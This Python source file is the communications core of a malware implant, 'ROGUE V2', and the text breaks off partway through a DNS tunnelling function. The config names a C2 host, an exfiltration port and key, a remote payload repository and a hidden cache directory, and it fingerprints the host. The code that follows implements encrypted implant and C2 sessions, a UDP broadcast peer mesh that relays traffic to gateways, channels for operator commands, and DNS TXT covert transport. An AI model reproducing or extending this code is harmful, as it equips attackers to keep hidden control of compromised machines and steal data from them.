#!/usr/bin/env python3
import socket, subprocess, base64, time, urllib.request, os, threading, sys
from Cryptodome.Cipher import AES
import zipfile, tempfile, shutil, json
import urllib.parse
import ssl
import hashlib
import re
from urllib.request import Request, urlopen

# === Config ===
SECRET_KEY = hashlib.sha256(b'6767BabyROGUE!&%5').digest()  # AES-256 (derived)
EXFIL_KEY = hashlib.sha256(b'magicRogueSEE!333').digest()  # AES-256 (derived)
C2_HOST = 'c2.example.com'
C2_PORT = 4444
EXFIL_PORT = 9091
PAYLOAD_REPO = "https://c2.example.com/payloads/"
HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
os.makedirs(HIDDEN_DIR, exist_ok=True)

# Implant unique identifier
IMPLANT_ID = f"{os.uname().nodename}_{os.getlogin()}_{os.getpid()}"
IMPLANT_ID_HASH = hashlib.md5(IMPLANT_ID.encode()).hexdigest()[:8]

# === Discord Fallback (Optional - env-driven) ===
# Set ROGUE_DISCORD_COMMAND_URL / ROGUE_DISCORD_WEBHOOK / ROGUE_DISCORD_TOKEN
# to enable the legacy Discord channel fallback.
DISCORD_COMMAND_URL = os.environ.get("ROGUE_DISCORD_COMMAND_URL", "")
DISCORD_WEBHOOK = os.environ.get("ROGUE_DISCORD_WEBHOOK", "")
BOT_TOKEN = os.environ.get("ROGUE_DISCORD_TOKEN", "")

# SSL context (untrusted certs tolerated)
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# ===== ROGUE-V2 COMMS CORE =====
# ============================================================================
# ROGUE V2 COMMS CORE
# ----------------------------------------------------------------------------
# Security properties (read the README section "ROGUE V2 PROTOCOL"):
#   * X25519 ECDH key exchange (mode "e")  -> forward secrecy, per-session keys
#   * HKDF-SHA256 key derivation with context separation (directions, seq)
#   * AES-256-GCM AEAD on every message (auth + integrity, no plaintext ops)
#   * Fallback mode "p": per-message keys derived from the operator secret
#     (no ECDH possible when the `cryptography` lib is absent) - still AEAD.
#   * Monotonic per-direction sequence numbers -> anti-replay
#   * Server static public key is pinned in the implant config ->
#     MITM cannot impersonate the C2 even over unauthenticated TLS
#   * Pseudonymous routing labels: HMAC(operator_secret, identity) -> hex,
#     so identities never travel in clear on the mesh.
#   * P2P mesh frames are encrypted with a time-bucketed group key, so
#     passive observers see only ciphertext.
# ============================================================================

import base64
import hashlib
import hmac
import json
import os
import socket
import struct
import threading
import time

# ---------------------------------------------------------------------------
# Backend detection
# ---------------------------------------------------------------------------
try:
    from cryptography.hazmat.primitives.asymmetric import x25519 as _rv2_x25519
    from cryptography.hazmat.primitives.serialization import (
        Encoding as _rv2_Enc,
        PublicFormat as _rv2_PubF,
        PrivateFormat as _rv2_PrivF,
        NoEncryption as _rv2_NoEnc,
    )
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _rv2_AESGCM

    _RV2_HAS_ECDH = True
except Exception:  # pragma: no cover - backend detection
    _rv2_x25519 = None
    _rv2_AESGCM = None
    _RV2_HAS_ECDH = False

try:
    from Cryptodome.Cipher import AES as _rv2_PyAES
    _RV2_HAS_CRYPTODOME = True
except Exception:
    try:
        from Crypto.Cipher import AES as _rv2_PyAES
        _RV2_HAS_CRYPTODOME = True
    except Exception:
        _rv2_PyAES = None
        _RV2_HAS_CRYPTODOME = False

RV2_MAGIC = "R2V2"          # JSON wire frames start with this key
RV2_HELLO = "__hello__"
RV2_HELLO_ACK = "__hello_ack__"
RV2_MESH_ANN = "__mesh_ann__"
RV2_MESH_DATA = "__mesh_data__"
RV2_MESH_ROOT = "__C2_ROOT__"     # virtual label of the C2 on the mesh
RV2_TS_SKEW = 600                 # seconds of acceptable clock skew (log only)
RV2_SESSION_TTL = 3600            # server session lifetime before rekey needed
RV2_MESH_TTL = 5                  # max mesh relay hops
RV2_MESH_SEEN_TTL = 120           # mesh duplicate/loop cache (seconds)
RV2_MESH_DAY = 86400


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------
def rv2_b64e(b):
    return base64.b64encode(b).decode("ascii")


def rv2_b64d(s):
    if isinstance(s, str):
        s = s.encode("ascii")
    return base64.b64decode(s)


def rv2_rand(n=16):
    return os.urandom(n)


def rv2_secret_bytes(secret):
    """Accept str/bytes secret; str treated as hex if it decodes, else utf-8."""
    if isinstance(secret, bytes):
        return secret
    try:
        return bytes.fromhex(secret)
    except Exception:
        return secret.encode("utf-8")


def rv2_hkdf(ikm, salt, info, length=32):
    """HKDF-SHA256 (RFC 5869) - stdlib only."""
    if salt is None:
        salt = b"\x00" * 32
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm = b""
    t = b""
    for i in range(1, 256):
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t
        if len(okm) >= length:
            break
    return okm[:length]


def rv2_hmac(key, msg):
    return hmac.new(key, msg, hashlib.sha256).digest()


def rv2_label(secret, ident):
    """Pseudonymous routing label for an identity."""
    return rv2_hmac(rv2_secret_bytes(secret), b"rogue-v2-label|" + ident.encode("utf-8")).hex()[:20]


def rv2_root_label(secret):
    return rv2_label(secret, RV2_MESH_ROOT)


def rv2_default_mode():
    if _RV2_HAS_ECDH:
        return "e"
    if _RV2_HAS_CRYPTODOME:
        return "p"
    return None


def rv2_gen_static_key():
    """Generate (private_raw, public_raw) X25519 pair. Returns (None, None) if unsupported."""
    if not _RV2_HAS_ECDH:
        return None, None
    priv = _rv2_x25519.X25519PrivateKey.generate()
    pub = priv.public_key().public_bytes(_rv2_Enc.Raw, _rv2_PubF.Raw)
    privb = priv.private_bytes(_rv2_Enc.Raw, _rv2_PrivF.Raw, _rv2_NoEnc())
    return privb, pub


# ---------------------------------------------------------------------------
# AEAD primitives (AES-256-GCM). Returns (ct, tag) / takes (ct, tag).
# ---------------------------------------------------------------------------
def rv2_aead_encrypt(key, nonce, plaintext, aad):
    if _RV2_HAS_ECDH:
        sealed = _rv2_AESGCM(key).encrypt(nonce, plaintext, aad)
        return sealed[:-16], sealed[-16:]
    c = _rv2_PyAES.new(key, _rv2_PyAES.MODE_GCM, nonce=nonce, mac_len=16)
    c.update(aad)
    ct, tag = c.encrypt_and_digest(plaintext)
    return ct, tag


def rv2_aead_decrypt(key, nonce, ct, tag, aad):
    if _RV2_HAS_ECDH:
        return _rv2_AESGCM(key).decrypt(nonce, ct + tag, aad)
    c = _rv2_PyAES.new(key, _rv2_PyAES.MODE_GCM, nonce=nonce, mac_len=16)
    c.update(aad)
    return c.decrypt_and_verify(ct, tag)


def rv2_derive_session(shared, salt, info_extra=b""):
    """Master session key from a DH shared secret + salt."""
    return rv2_hkdf(shared, salt, b"rogue-v2-kex|" + info_extra, 32)


def rv2_dir_keys(master):
    """Split master into per-direction AEAD keys (context separation)."""
    c2s = rv2_hkdf(master, b"", b"rogue-v2-dir-c2s", 32)
    s2c = rv2_hkdf(master, b"", b"rogue-v2-dir-s2c", 32)
    return c2s, s2c


def rv2_x25519_shared(priv_raw, pub_raw):
    """Raw X25519 shared secret. Raises if backend missing."""
    if not _RV2_HAS_ECDH:
        raise RuntimeError("ECDH backend unavailable")
    priv = _rv2_x25519.X25519PrivateKey.from_private_bytes(priv_raw)
    peer = _rv2_x25519.X25519PublicKey.from_public_bytes(pub_raw)
    return priv.exchange(peer)


# ---------------------------------------------------------------------------
# Wire envelope
# ---------------------------------------------------------------------------
def rv2_env(mode, ct, tag, nonce, salt, q, src, dst=None, k=None, h=None):
    env = {
        "v": 2,
        "m": mode,
        "n": rv2_b64e(nonce),
        "a": rv2_b64e(tag),
        "c": rv2_b64e(ct),
        "z": rv2_b64e(salt) if salt else "",
        "q": q,
        "s": src,
    }
    if dst:
        env["d"] = dst
    if k:
        env["k"] = rv2_b64e(k)
    if h is not None:
        env["h"] = h
    return json.dumps(env, separators=(",", ":")).encode("utf-8")


def rv2_parse_env(wire):
    if isinstance(wire, bytes):
        wire = wire.decode("utf-8", "replace")
    env = json.loads(wire)
    if env.get("v") != 2:
        raise ValueError("not a v2 frame")
    return env


def rv2_aad(mode, q, direction, dst=None):
    aad = b"rogue-v2|" + mode.encode("ascii") + b"|" + str(q).encode("ascii") + b"|" + direction.encode("ascii")
    if dst:
        aad += b"|" + dst.encode("ascii")
    return aad


# ---------------------------------------------------------------------------
# Client (implant side)
# ---------------------------------------------------------------------------
class RogueV2Client(object):
    """One E2E crypto context for an implant talking to the C2."""

    def __init__(self, secret, static_pub_b64=None, implant_id="unknown", mode=None, tls_verify=False):
        self.secret = rv2_secret_bytes(secret)
        self.static_pub = rv2_b64d(static_pub_b64) if static_pub_b64 else None
        self.id = implant_id or "unknown"
        self.label = rv2_label(self.secret, self.id)
        self.mode = mode or rv2_default_mode() or "p"
        if self.mode == "e" and not (_RV2_HAS_ECDH and self.static_pub):
            self.mode = "p"          # graceful downgrade, still AEAD-authenticated
        self.tls_verify = tls_verify
        # session state (mode e)
        self._keys = None            # (c2s, s2c) once hello is answered
        self._q_out = 0
        self._q_in_last = 0
        self._session_ts = 0
        self._hello_wire = None

    # -- helpers ------------------------------------------------------------
    def _seal(self, plaintext, q, direction, dst=None):
        mode = self.mode
        salt = rv2_rand(16)
        if mode == "e":
            if not self._keys:
                raise RuntimeError("session not established (no hello_ack)")
            c2s, s2c = self._keys
            key = c2s if direction == "c2s" else s2c
            master = None
        else:
            key = rv2_hkdf(self.secret, salt, b"rogue-v2-psk|" + direction.encode("ascii") + b"|" + str(q).encode("ascii"), 32)
            master = None
        nonce = rv2_rand(12)
        ct, tag = rv2_aead_encrypt(key, nonce, plaintext, rv2_aad(mode, q, direction, dst))
        return rv2_env(mode, ct, tag, nonce, salt, q, self.label, dst=dst)

    def _open(self, wire, direction):
        env = rv2_parse_env(wire)
        if env["m"] != self.mode:
            # downgrade tolerance: accept p frames only if we are in p
            raise ValueError("mode mismatch")
        salt = rv2_b64d(env["z"]) if env.get("z") else b""
        q = env["q"]
        if q <= self._q_in_last:
            raise ValueError("replay (q=%d <= %d)" % (q, self._q_in_last))
        if env["m"] == "e":
            if not self._keys:
                raise ValueError("no session keys yet")
            c2s, s2c = self._keys
            key = c2s if direction == "c2s" else s2c
        else:
            key = rv2_hkdf(self.secret, salt, b"rogue-v2-psk|" + direction.encode("ascii") + b"|" + str(q).encode("ascii"), 32)
        plain = rv2_aead_decrypt(key, rv2_b64d(env["n"]), rv2_b64d(env["c"]), rv2_b64d(env["a"]), rv2_aad(env["m"], q, direction, env.get("d")))
        self._q_in_last = q
        return json.loads(plain.decode("utf-8"))

    # -- public API ---------------------------------------------------------
    def build_hello(self):
        """Return the hello wire frame for a fresh session (mode e) or a
        stateless identity frame (mode p)."""
        self._q_out = 0
        self._q_in_last = 0
        inner = {"o": RV2_HELLO, "id": self.id, "ts": int(time.time() * 1000), "m": self.mode}
        if self.mode == "e":
            eph = _rv2_x25519.X25519PrivateKey.generate()
            eph_pub = eph.public_key().public_bytes(_rv2_Enc.Raw, _rv2_PubF.Raw)
            salt = rv2_rand(16)
            # bind the operator secret into the hello: the ECDH AEAD alone only
            # proves possession of the (public) static key, so anyone could
            # impersonate an implant. This HMAC proves knowledge of the secret.
            inner["a"] = rv2_hmac(self.secret, eph_pub + salt + b"|" + self.id.encode("utf-8")).hex()
            shared = eph.exchange(_rv2_x25519.X25519PublicKey.from_public_bytes(self.static_pub))
            master = rv2_derive_session(shared, salt, b"|" + eph_pub + self.static_pub)
            c2s, s2c = rv2_dir_keys(master)
            self._keys = (c2s, s2c)
            self._session_ts = time.time()
            nonce = rv2_rand(12)
            # AAD binds q + direction; k/z carried in envelope for the server
            aad = rv2_aad(self.mode, 0, "c2s")
            ct, tag = rv2_aead_encrypt(c2s, nonce, json.dumps(inner).encode("utf-8"), aad)
            self._q_out = 1  # next frame after hello uses q=1
            env = rv2_env(self.mode, ct, tag, nonce, salt, 0, self.label, k=eph_pub)
            return env
        else:
            # mode p: per-message key derivation proves knowledge of secret
            self._q_out = 1
            return self._seal(json.dumps(inner).encode("utf-8"), 0, "c2s")

    def handle_hello_ack(self, wire):
        """Process the server hello_ack, completing session establishment."""
        inner = self._open(wire, "s2c")
        if inner.get("o") != RV2_HELLO_ACK:
            raise ValueError("expected hello_ack")
        return inner

    def seal_op(self, opdict, dst=None):
        """Seal an operation dict to the C2. opdict: {"o": <op string>, ...}"""
        if self._q_out == 0:
            raise RuntimeError("call build_hello() first")
        q = self._q_out
        self._q_out += 1
        return self._seal(json.dumps(opdict).encode("utf-8"), q, "c2s", dst=dst)

    def open_op(self, wire):
        """Open a frame from the C2. Returns the inner op dict."""
        return self._open(wire, "s2c")

    def is_ready(self):
        if self.mode == "e":
            return self._keys is not None and (time.time() - self._session_ts) < RV2_SESSION_TTL
        return True

    def rekey_needed(self):
        if self.mode == "e":
            return (time.time() - self._session_ts) >= RV2_SESSION_TTL
        return False


# ---------------------------------------------------------------------------
# Server (C2 side)
# ---------------------------------------------------------------------------
class RogueV2Server(object):
    """Accepts hellos from implants, keeps per-label sessions, seals replies."""

    def __init__(self, secret, static_priv_raw=None):
        self.secret = rv2_secret_bytes(secret)
        self.priv = static_priv_raw
        self.sessions = {}      # label -> dict(mode, id, bot_id, keys, q_in, q_out, ts, ip)
        self._lock = threading.Lock()

    # -- internal -----------------------------------------------------------
    def _session_key(self, label, direction):
        s = self.sessions.get(label)
        if not s:
            raise ValueError("unknown session %s" % label)
        c2s, s2c = s["keys"]
        return c2s if direction == "c2s" else s2c

    def _open_data(self, env, direction, ip=""):
        label = env["s"]
        mode = env["m"]
        salt = rv2_b64d(env["z"]) if env.get("z") else b""
        q = env["q"]
        if mode == "e":
            key = self._session_key(label, direction)
        else:
            key = rv2_hkdf(self.secret, salt, b"rogue-v2-psk|" + direction.encode("ascii") + b"|" + str(q).encode("ascii"), 32)
        plain = rv2_aead_decrypt(key, rv2_b64d(env["n"]), rv2_b64d(env["c"]), rv2_b64d(env["a"]), rv2_aad(mode, q, direction, env.get("d")))
        return json.loads(plain.decode("utf-8"))

    # -- public API ---------------------------------------------------------
    def recv(self, wire, ip=""):
        """Handle one frame. Returns (inner_opdict, label, is_new_session)."""
        env = rv2_parse_env(wire)
        label = env["s"]
        mode = env["m"]
        q = env["q"]
        nonce = rv2_b64d(env["n"])
        ct = rv2_b64d(env["c"])
        tag = rv2_b64d(env["a"])
        salt = rv2_b64d(env["z"]) if env.get("z") else b""
        with self._lock:
            sess = self.sessions.get(label)

            if q == 0:
                # ---- hello frame (fresh session / rekey) ----
                if mode == "e":
                    if not _RV2_HAS_ECDH or not self.priv:
                        raise ValueError("ECDH hello but server has no static key")
                    k = rv2_b64d(env["k"])
                    shared = rv2_x25519_shared(self.priv, k)
                    master = rv2_derive_session(shared, salt, b"|" + k + self.static_pub())
                    keys = rv2_dir_keys(master)
                    key = keys[0]  # c2s
                else:
                    keys = None
                    key = rv2_hkdf(self.secret, salt,
                                   b"rogue-v2-psk|c2s|0", 32)
                try:
                    plain = rv2_aead_decrypt(key, nonce, ct, tag, rv2_aad(mode, 0, "c2s"))
                except Exception:
                    raise ValueError("hello authentication failed")
                inner = json.loads(plain.decode("utf-8"))
                if inner.get("o") != RV2_HELLO:
                    raise ValueError("expected hello frame")
                if mode == "e":
                    # verify operator-secret proof (see client build_hello)
                    k_raw = rv2_b64d(env["k"])
                    expected = rv2_hmac(self.secret, k_raw + salt + b"|" + str(inner.get("id", "")).encode("utf-8")).hex()
                    if not hmac.compare_digest(expected, str(inner.get("a", ""))):
                        raise ValueError("hello authentication failed")
                if sess is None:
                    sess = {"mode": mode, "id": inner.get("id", "unknown"),
                            "bot_id": None, "keys": keys, "q_in": 0,
                            "q_out": 0, "ts": time.time(), "ip": ip}
                    self.sessions[label] = sess
                else:
                    sess["mode"] = mode
                    sess["id"] = inner.get("id", sess.get("id", "unknown"))
                    sess["keys"] = keys
                    sess["ts"] = time.time()
                    sess["ip"] = ip
                sess["q_in"] = 0
                return inner, label, True

            # ---- data frame ----
            if sess is None:
                if mode != "p":
                    raise ValueError("unknown session %s" % label)
                # p-mode is stateless (per-message keys from the shared secret)
                sess = {"mode": "p", "id": "label_" + label, "bot_id": None,
                        "keys": None, "q_in": 0, "q_out": 0,
                        "ts": time.time(), "ip": ip}
                self.sessions[label] = sess
            if q <= sess["q_in"]:
                raise ValueError("replay (q=%d <= %d)" % (q, sess["q_in"]))
            inner = self._open_data(env, "c2s", ip=ip)
            sess["q_in"] = q
            sess["ts"] = time.time()
            sess["ip"] = ip
            return inner, label, False

    def reply(self, label, opdict):
        """Seal a reply to an implant session."""
        with self._lock:
            sess = self.sessions.get(label)
            if not sess:
                raise ValueError("unknown session %s" % label)
            q = sess["q_out"] + 1
            sess["q_out"] = q
            mode = sess["mode"]
            salt = rv2_rand(16)
            if mode == "e":
                key = self._session_key(label, "s2c")
            else:
                key = rv2_hkdf(self.secret, salt, b"rogue-v2-psk|s2c|" + str(q).encode("ascii"), 32)
            nonce = rv2_rand(12)
            ct, tag = rv2_aead_encrypt(key, nonce, json.dumps(opdict).encode("utf-8"),
                                       rv2_aad(mode, q, "s2c", label))
            return rv2_env(mode, ct, tag, nonce, salt, q, rv2_root_label(self.secret), dst=label)

    def static_pub(self):
        if not _RV2_HAS_ECDH:
            return b""
        pub = _rv2_x25519.X25519PrivateKey.from_private_bytes(self.priv).public_key()
        return pub.public_bytes(_rv2_Enc.Raw, _rv2_PubF.Raw)

    def expire(self):
        now = time.time()
        with self._lock:
            dead = [k for k, s in self.sessions.items() if now - s["ts"] > RV2_SESSION_TTL * 2]
            for k in dead:
                del self.sessions[k]


# ---------------------------------------------------------------------------
# Encrypted P2P mesh (UDP broadcast domain)
# ---------------------------------------------------------------------------
class RogueMesh(object):
    """Always-on encrypted peer mesh.

    * Every frame is AEAD-encrypted under a time-bucketed group key derived
      from the operator secret (rotates daily).
    * Peers authenticate by proving knowledge of the group key.
    * `announce` frames gossip (label, gateway-capability) so every peer can
      route to every other peer by label.
    * `data` frames carry raw E2E C2 frames; non-gateway peers forward them
      toward a gateway (`d` == mesh root label). Gateways deliver them to the
      C2 via their direct channel (on_root callback). Replies walk back by
      dst-label routing.
    """

    def __init__(self, secret, my_label, ports=(7008, 7009, 7010, 7011),
                 announce_interval=45, on_root=None, on_me=None, log=None):
        self.secret = rv2_secret_bytes(secret)
        self.my_label = my_label
        self.ports = ports
        self.announce_interval = announce_interval
        self.on_root = on_root          # cb(raw_wire) -> raw_wire or None
        self.on_me = on_me              # cb(raw_wire) -> None (C2 reply for me)
        self.log = log or (lambda *a: None)
        self.peers = {}                 # label -> {addr, gw, ts, last_ann}
        self._q = 0
        self._lock = threading.Lock()
        self._seen = {}                 # (s,q) -> ts  loop cache
        self._gw = False                # am I currently C2-reachable?
        self._sock = None
        self._running = False

    # -- group key (rotates daily) -----------------------------------------
    def _mesh_key(self, bucket_ts):
        salt = struct.pack(">q", int(bucket_ts // RV2_MESH_DAY))
        return rv2_hkdf(self.secret, salt, b"rogue-v2-mesh", 32)

    # -- packet build/parse ------------------------------------------------
    def _seal_mesh(self, inner, q, dst=None, ttl=None):
        mode = "p"  # mesh always uses per-message keys
        salt = rv2_rand(16)
        key = rv2_hkdf(self._mesh_key(time.time()), salt,
                       b"rogue-v2-mesh|" + str(q).encode("ascii"), 32)
        nonce = rv2_rand(12)
        aad = b"rogue-mesh|" + str(q).encode("ascii") + b"|" + self.my_label.encode("ascii")
        if dst:
            aad += b"|" + dst.encode("ascii")
        ct, tag = rv2_aead_encrypt(key, nonce, json.dumps(inner).encode("utf-8"), aad)
        return rv2_env(mode, ct, tag, nonce, salt, q, self.my_label, dst=dst, h=ttl)

    def _open_mesh(self, packet):
        env = rv2_parse_env(packet)
        q = env["q"]
        salt = rv2_b64d(env["z"])
        key = None
        # try current and previous day bucket (clock/rotation tolerance)
        for bucket in (time.time(), time.time() - RV2_MESH_DAY):
            kk = rv2_hkdf(self._mesh_key(bucket), salt,
                          b"rogue-v2-mesh|" + str(q).encode("ascii"), 32)
            try:
                plain = rv2_aead_decrypt(kk, rv2_b64d(env["n"]), rv2_b64d(env["c"]),
                                         rv2_b64d(env["a"]),
                                         b"rogue-mesh|" + str(q).encode("ascii") + b"|" + env["s"].encode("ascii") + (b"|" + env["d"].encode("ascii") if env.get("d") else b""))
                key = kk
                break
            except Exception:
                continue
        if key is None:
            raise ValueError("mesh auth failed")
        return json.loads(plain.decode("utf-8")), env["s"], env["q"], env.get("d"), env.get("h")

    # -- peer table ---------------------------------------------------------
    def set_gateway(self, gw):
        self._gw = bool(gw)

    def is_gateway(self):
        return self._gw

    def peer_addrs(self, label):
        with self._lock:
            p = self.peers.get(label)
            if p and time.time() - p["ts"] < 600:
                return p["addr"]
        return None

    def _learn(self, label, addr, gw, ann=False):
        now = time.time()
        with self._lock:
            p = self.peers.get(label)
            if p:
                p["addr"] = addr
                p["gw"] = gw or p["gw"]
                p["ts"] = now
                if ann:
                    p["last_ann"] = now
            else:
                self.peers[label] = {"addr": addr, "gw": gw, "ts": now, "last_ann": now if ann else 0}
            # prune stale
            dead = [k for k, v in self.peers.items() if now - v["ts"] > 600]
            for k in dead:
                del self.peers[k]

    def _pick_route(self, dst_label, exclude=None):
        """Pick a peer to forward toward dst_label (gw peers preferred for root)."""
        now = time.time()
        with self._lock:
            cands = [(l, p) for l, p in self.peers.items()
                     if l != self.my_label and l != exclude and now - p["ts"] < 300]
        if dst_label == rv2_root_label(self.secret):
            gws = [c for c in cands if c[1]["gw"]]
            if gws:
                cands = gws
        if not cands:
            return None
        cands.sort(key=lambda c: (0 if c[1]["gw"] else 1, -c[1]["ts"]))
        return cands[0]

    # -- sending ------------------------------------------------------------
    def send_data(self, raw_wire, dst_label):
        """Send an E2E raw frame toward dst_label (usually the mesh root)."""
        self._q += 1
        q = self._q
        inner = {"o": RV2_MESH_DATA, "b": rv2_b64e(raw_wire)}
        if dst_label == rv2_root_label(self.secret):
            hop = self._pick_route(dst_label)
            if hop is None:
                return False
            addr = hop[1]["addr"]
            packet = self._seal_mesh(inner, q, dst=dst_label, ttl=RV2_MESH_TTL)
            return self._udp_send(packet, addr)
        addr = self.peer_addrs(dst_label)
        if addr is None:
            hop = self._pick_route(dst_label)
            if hop is None:
                return False
            addr = hop[1]["addr"]
        packet = self._seal_mesh(inner, q, dst=dst_label, ttl=RV2_MESH_TTL)
        return self._udp_send(packet, addr)

    def send_announce(self):
        self._q += 1
        inner = {"o": RV2_MESH_ANN, "g": 1 if self._gw else 0}
        packet = self._seal_mesh(inner, self._q)
        for port in self.ports:
            try:
                self._sock.sendto(packet, ("<broadcast>", port))
            except Exception:
                pass
            try:
                self._sock.sendto(packet, ("255.255.255.255", port))
            except Exception:
                pass

    def _udp_send(self, packet, addr):
        try:
            self._sock.sendto(packet, (addr[0], addr[1]))
            return True
        except Exception as e:
            self.log("[mesh] send failed: %s" % e)
            return False

    # -- receive loop -------------------------------------------------------
    def _handle(self, packet, addr):
        try:
            inner, src_label, q, dst_label, ttl = self._open_mesh(packet)
        except Exception:
            return  # unauthenticated / undecryptable -> drop
        now = time.time()
        seen_key = (src_label, q)
        if seen_key in self._seen and now - self._seen[seen_key] < RV2_MESH_SEEN_TTL:
            return
        self._seen[seen_key] = now
        typ = inner.get("o")
        gw_flag = bool(inner.get("g"))

        if typ == RV2_MESH_ANN:
            is_new = src_label not in self.peers
            self._learn(src_label, (addr[0], addr[1]), gw_flag, ann=True)
            # reply with our own announce ONLY to brand-new peers (bootstrap),
            # otherwise every announce would trigger an infinite reply ping-pong
            if is_new:
                self._q += 1
                self._udp_send(self._seal_mesh({"o": RV2_MESH_ANN, "g": 1 if self._gw else 0}, self._q), (addr[0], addr[1]))
            return

        if typ == RV2_MESH_DATA:
            raw = rv2_b64d(inner["b"])
            if dst_label == rv2_root_label(self.secret):
                # I am the gateway hop: deliver to C2 via direct channel
                if self.on_root:
                    resp = self.on_root(raw)
                    if resp:
                        self._q += 1
                        back = self._seal_mesh({"o": RV2_MESH_DATA, "b": rv2_b64e(resp)},
                                               self._q, dst=src_label, ttl=RV2_MESH_TTL)
                        a = self.peer_addrs(src_label)
                        if a:
                            self._udp_send(back, a)
                        else:
                            hop = self._pick_route(src_label, exclude=src_label)
                            if hop:
                                self._udp_send(back, hop[1]["addr"])
                return
            if dst_label == self.my_label:
                # a C2 reply made it back to me
                if self.on_me:
                    self.on_me(raw)
                return
            # forward toward destination
            ttl = ttl if ttl is not None else RV2_MESH_TTL
            if ttl <= 1:
                return
            hop = self._pick_route(dst_label, exclude=src_label)
            if not hop:
                return
            self._q += 1
            self._udp_send(self._seal_mesh({"o": RV2_MESH_DATA, "b": rv2_b64e(raw)},
                                           self._q, dst=dst_label, ttl=ttl - 1), hop[1]["addr"])

    def start(self):
        if self._running:
            return
        self._running = True
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        # NOTE: no SO_REUSEADDR - it would let two implants on one host bind the
        # same UDP port, making unicast delivery ambiguous. First-free-port wins.
        bound = False
        for port in self.ports:
            try:
                sock.bind(("0.0.0.0", port))
                bound = True
                break
            except OSError:
                continue
        if not bound:
            self.log("[mesh] failed to bind any port")
            self._running = False
            return False
        self._sock = sock
        threading.Thread(target=self._rx_loop, daemon=True).start()
        threading.Thread(target=self._ann_loop, daemon=True).start()
        return True

    def _rx_loop(self):
        while self._running:
            try:
                packet, addr = self._sock.recvfrom(65535)
            except OSError:
                break
            try:
                self._handle(packet, addr)
            except Exception:
                continue

    def _ann_loop(self):
        # announce immediately on start, then on the interval
        self.send_announce()
        while self._running:
            time.sleep(self.announce_interval)
            self.send_announce()

    def stop(self):
        self._running = False
        try:
            self._sock.close()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# OOB (out-of-band) channel helpers - operator <-> implant command frames.
# These are PSK-sealed with the operator secret so ONLY fleet members can
# read/write them, with a coarse timestamp window + seen-set for replay
# protection (operator is the only writer, so per-message keys + ts window
# are sufficient here).
# ---------------------------------------------------------------------------
def rv2_oob_seal(secret, opdict, ts=None):
    """Seal an operator->implant OOB command frame (PSK mode)."""
    secret = rv2_secret_bytes(secret)
    inner = dict(opdict)
    inner["ts"] = int(ts if ts is not None else time.time() * 1000)
    salt = rv2_rand(16)
    key = rv2_hkdf(secret, salt, b"rogue-v2-oob|1", 32)
    nonce = rv2_rand(12)
    q = 1
    ct, tag = rv2_aead_encrypt(key, nonce, json.dumps(inner).encode("utf-8"), rv2_aad("p", q, "oob"))
    env = rv2_env("p", ct, tag, nonce, salt, q, rv2_label(secret, "__OPERATOR__"))
    return base64.b64encode(env).decode("ascii")  # channel-friendly (webhook/chat)


def rv2_oob_open(secret, b64frame, seen=None, window_ms=300000):
    """Open an OOB frame. `seen` is a set of ts values already handled.
    Raises ValueError on auth failure / replay / stale frame."""
    secret = rv2_secret_bytes(secret)
    env = rv2_parse_env(rv2_b64d(b64frame))
    if env.get("m") != "p":
        raise ValueError("oob frame must be psk mode")
    salt = rv2_b64d(env["z"])
    q = env["q"]
    key = rv2_hkdf(secret, salt, b"rogue-v2-oob|" + str(q).encode("ascii"), 32)
    plain = rv2_aead_decrypt(key, rv2_b64d(env["n"]), rv2_b64d(env["c"]), rv2_b64d(env["a"]),
                             rv2_aad("p", q, "oob"))
    inner = json.loads(plain.decode("utf-8"))
    now = time.time() * 1000
    if abs(now - inner.get("ts", 0)) > window_ms:
        raise ValueError("oob frame stale")
    if seen is not None and inner["ts"] in seen:
        raise ValueError("oob frame replay")
    return inner


# ---------------------------------------------------------------------------
# DNS-over-stdlib client helper (used by the DNS transport channel)
# ---------------------------------------------------------------------------
def rv2_dns_query_txt(qname, resolver_ip, timeout=6.0, tries=2, resolver_port=53):
    """Minimal DNS TXT query over UDP using only the stdlib.

    Returns the concatenation of all TXT strings, or None on failure.
    """
    import random as _random

    def _build_query(domain, qid):
        out = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 1)  # arcount=1 (EDNS0 OPT)
        for label in domain.split("."):
            lb = label.encode("ascii")
            if len(lb) > 63:
                return None
            out += bytes([len(lb)]) + lb
        out += b"\x00"
        out += struct.pack(">HH", 16, 1)  # TXT, IN
        # EDNS0 OPT RR: root name, type 41, class = 4096 (UDP payload), ttl 0
        out += b"\x00" + struct.pack(">HHIH", 41, 4096, 0, 0)
        return out

    def _parse_txt(resp):
        if len(resp) < 12:
            return None
        (qid, flags, qd, an, ns, ar) = struct.unpack(">HHHHHH", resp[:12])
        if flags & 0x000F != 0:
            return None
        off = 12
        # skip question
        while off < len(resp) and resp[off] != 0:
            if resp[off] & 0xC0 == 0xC0:
                off += 2
                break
            off += 1 + resp[off]
        off += 1 + 4
        # answers
        txts = []
        for _ in range(an):
            if off >= len(resp):
                break
            if resp[off] & 0xC0 == 0xC0:
                off += 2
            else:
                while off < len(resp) and resp[off] != 0:
                    off += 1 + resp[off]
                off += 1
            off += 10  # type, class, ttl, rdlen
            rdlen = struct.unpack(">H", resp[off - 2:off])[0]
            end = off + rdlen
            while off < end:
                ln = resp[off]
                off += 1
                txts.append(resp[off:off + ln].decode("utf-8", "replace"))
                off += ln
        return "".join(txts)

    for attempt in range(tries):
        qid = _random.randint(0, 65535)
        pkt = _build_query(qname, qid)
        if pkt is None:
            return None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(pkt, (resolver_ip, resolver_port))
            data = s.recvfrom(65535)[0]
            s.close()
            parsed_qid = struct.unpack(">H", data[:2])[0]
            if parsed_qid != qid:
                continue
            res = _parse_txt(data)
            if res is not None:
                return res
        except Exception:
            continue
    return None


def rv2_dns_tunnel_send(raw_wire, zone, resolver_ip, seq=0, resolver_port=53):
